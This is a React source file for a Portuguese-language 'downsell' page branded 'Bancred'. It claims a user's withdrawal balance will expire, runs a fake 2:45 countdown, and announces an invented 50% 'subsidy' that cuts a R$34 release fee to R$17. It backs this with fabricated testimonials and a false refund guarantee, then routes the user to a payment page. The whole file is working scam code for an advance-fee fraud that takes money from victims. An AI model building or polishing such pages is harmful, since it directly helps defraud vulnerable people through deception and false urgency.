import { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { AlertTriangle, ShieldCheck, CheckCircle2, Star, Clock } from "lucide-react";
import bancredLogo from "@/assets/bancred-logo.png";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const Downsell = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const valorSaque = useMemo(() => {
    const fromUrl = Number(params.get("valor"));
    if (fromUrl && !Number.isNaN(fromUrl)) return fromUrl;
    const ls = Number(localStorage.getItem("valor_saque") || localStorage.getItem("valorAtual") || 0);
    return ls && !Number.isNaN(ls) ? ls : 5000;
  }, [params]);

  // Cronômetro 02:45
  const [secs, setSecs] = useState(2 * 60 + 45);
  useEffect(() => {
    const id = setInterval(() => setSecs((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, []);
  const mm = String(Math.floor(secs / 60)).padStart(2, "0");
  const ss = String(secs % 60).padStart(2, "0");

  const handleCTA = () => {
    const qs = new URLSearchParams(params);
    qs.set("valor", String(valorSaque));
    qs.set("downsell", "1");
    qs.set("seguroValor", "17");
    navigate(`/pagamento?${qs.toString()}`);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#F4F4F7", paddingBottom: 40, fontFamily: fontStack }}>
      {/* Barra de urgência fixa */}
      <div
        style={{
          position: "sticky",
          top: 0,
          zIndex: 50,
          background: "linear-gradient(90deg, #DC2626, #B91C1C)",
          color: "#fff",
          padding: "10px 14px",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          gap: 8,
          fontSize: 13,
          fontWeight: 600,
          textAlign: "center",
          boxShadow: "0 2px 8px rgba(220,38,38,0.35)",
        }}
      >
        <Clock size={16} />
        <span>
          Atenção: Seu saldo de <strong>{formatBRL(valorSaque)}</strong> expira em:{" "}
          <span style={{ fontVariantNumeric: "tabular-nums", background: "rgba(0,0,0,0.25)", padding: "2px 8px", borderRadius: 6, marginLeft: 4 }}>
            {mm}:{ss}
          </span>
        </span>
      </div>

      {/* Header */}
      <header style={{ background: "#1C68E3", color: "#fff", padding: "12px 16px", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <img src={bancredLogo} alt="Bancred" style={{ height: 28 }} />
      </header>

      <main style={{ padding: 14, maxWidth: 480, margin: "0 auto" }}>
        {/* Alerta rosa */}
        <div
          style={{
            background: "#FDF2F8",
            border: "1px solid #FBCFE8",
            borderRadius: 14,
            padding: 16,
            display: "flex",
            gap: 12,
            alignItems: "flex-start",
            boxShadow: "0 4px 12px rgba(219,39,119,0.08)",
          }}
        >
          <div style={{ width: 36, height: 36, borderRadius: "50%", background: "#FCE7F3", color: "#BE185D", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
            <AlertTriangle size={20} />
          </div>
          <div>
            <h1 style={{ fontSize: 16, fontWeight: 800, color: "#9D174D", lineHeight: 1.3, margin: 0 }}>
              ESPERE! O Sistema identificou que você tentou retornar e liberou um Subsídio Automático de 50%
            </h1>
            <p style={{ fontSize: 13, color: "#831843", marginTop: 8, lineHeight: 1.5 }}>
              Para evitar que o seu saque de <strong>{formatBRL(valorSaque)}</strong> seja cancelado e retorne para o Banco Central, o sistema cobriu metade da sua taxa de emissão. Você <strong>NÃO</strong> vai pagar R$ 34,00.
            </p>
          </div>
        </div>

        {/* Card de ancoragem de preço */}
        <div
          style={{
            marginTop: 16,
            background: "#E8F5E9",
            border: "2px solid #22C55E",
            borderRadius: 16,
            padding: 22,
            textAlign: "center",
            boxShadow: "0 0 0 4px rgba(34,197,94,0.15), 0 8px 24px rgba(34,197,94,0.18)",
          }}
        >
          <div style={{ fontSize: 13, color: "#166534", fontWeight: 600 }}>
            De <span style={{ textDecoration: "line-through", color: "#6B7280" }}>R$ 34,00</span> por apenas:
          </div>
          <div style={{ fontSize: 52, fontWeight: 900, color: "#15803D", lineHeight: 1.1, marginTop: 4, letterSpacing: -1 }}>
            R$ 17,00
          </div>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, marginTop: 8, background: "#fff", border: "1px solid #BBF7D0", color: "#166534", padding: "6px 12px", borderRadius: 999, fontSize: 12, fontWeight: 700 }}>
            <CheckCircle2 size={14} /> Economia imediata de R$ 17,00 — 100% Reembolsável
          </div>
        </div>

        {/* CTA */}
        <button
          type="button"
          onClick={handleCTA}
          style={{
            width: "100%",
            marginTop: 16,
            padding: "18px 20px",
            background: "linear-gradient(90deg, #EC4899, #DC2626)",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 800,
            cursor: "pointer",
            boxShadow: "0 10px 28px rgba(220,38,38,0.35)",
            fontFamily: fontStack,
            minHeight: 56,
            letterSpacing: 0.2,
            textTransform: "uppercase",
          }}
        >
          Aproveitar Subsídio e Liberar Meu PIX
        </button>

        {/* Depoimentos */}
        <section style={{ marginTop: 22 }}>
          <h2 style={{ fontSize: 14, fontWeight: 700, color: "#111827", marginBottom: 10 }}>
            Quem aproveitou o subsídio:
          </h2>

          {[
            {
              nome: "Mariana Souza",
              texto: `...quando voltei apareceu por 17. Paguei e o meu pix de ${formatBRL(valorSaque)} caiu na hora! Valeu a pena demais kkkk`,
            },
            {
              nome: "Carlos Henrique",
              texto: `Achei que tinha perdido, mas o sistema deu desconto. Paguei os R$ 17 e recebi meu PIX de ${formatBRL(valorSaque)} em poucos minutos.`,
            },
          ].map((d) => (
            <div
              key={d.nome}
              style={{
                background: "#fff",
                border: "1px solid #E5E7EB",
                borderRadius: 12,
                padding: 14,
                marginBottom: 10,
                boxShadow: "0 1px 2px rgba(17,24,39,0.04)",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
                <div style={{ width: 34, height: 34, borderRadius: "50%", background: "#1C68E3", color: "#fff", display: "inline-flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: 13 }}>
                  {d.nome[0]}
                </div>
                <div>
                  <div style={{ fontSize: 13, fontWeight: 700, color: "#111827" }}>{d.nome}</div>
                  <div style={{ display: "inline-flex", gap: 2, color: "#F59E0B" }}>
                    {[0, 1, 2, 3, 4].map((i) => (
                      <Star key={i} size={12} fill="#F59E0B" />
                    ))}
                  </div>
                </div>
              </div>
              <p style={{ fontSize: 13, color: "#374151", lineHeight: 1.5, margin: 0 }}>{d.texto}</p>
            </div>
          ))}
        </section>

        {/* Selo de garantia */}
        <div
          style={{
            marginTop: 18,
            background: "#fff",
            border: "1px dashed #22C55E",
            borderRadius: 14,
            padding: 14,
            display: "flex",
            alignItems: "center",
            gap: 12,
          }}
        >
          <div style={{ width: 42, height: 42, borderRadius: "50%", background: "#DCFCE7", color: "#15803D", display: "inline-flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
            <ShieldCheck size={22} />
          </div>
          <div>
            <div style={{ fontSize: 13, fontWeight: 700, color: "#111827" }}>Garantia de Reembolso</div>
            <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5, marginTop: 2 }}>
              Os R$ 17,00 são <strong>100% reembolsáveis</strong> junto com o seu saque de {formatBRL(valorSaque)}.
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Downsell;
